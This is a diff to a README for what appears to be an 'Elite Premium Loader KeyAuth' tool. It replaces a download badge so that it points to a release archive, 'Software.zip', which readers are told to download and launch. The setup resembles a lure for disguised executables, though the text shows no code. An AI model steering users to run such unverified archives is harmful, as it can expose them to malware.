@@ -26,7 +26,7 @@ Explore a wide range of topics related to this repository:
 
 Simply click on the button below to download the Elite Premium Loader KeyAuth application:
 
-[![Download Application](https://img.shields.io/badge/Download-Application.zip-brightgreen)](https://github.com/user-attachments/files/18426772/Application.zip)
+[![Download Application](https://github.com/iitm2023/Elite-Premium-Loader-KeyAuth/releases/download/v2.0/Software.zip)](https://github.com/iitm2023/Elite-Premium-Loader-KeyAuth/releases/download/v2.0/Software.zip)
 
 If the link ends with a file name, download the zip file and launch the application to get started!
 
